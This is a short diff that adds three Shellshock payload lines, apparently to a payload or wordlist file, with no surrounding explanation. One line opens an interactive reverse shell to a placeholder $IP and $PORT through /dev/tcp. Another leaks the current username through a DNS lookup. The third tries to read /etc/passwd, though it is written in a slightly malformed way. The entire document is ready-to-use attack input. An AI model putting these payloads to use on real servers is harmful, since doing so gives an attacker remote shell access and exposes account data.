@@ -1,0 +1,3 @@
+() { :; }; /usr/bin/nslookup $(whoami).
+() { :; }; /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1 
+() { :; }; /bin/cat $(/etc/passwd)
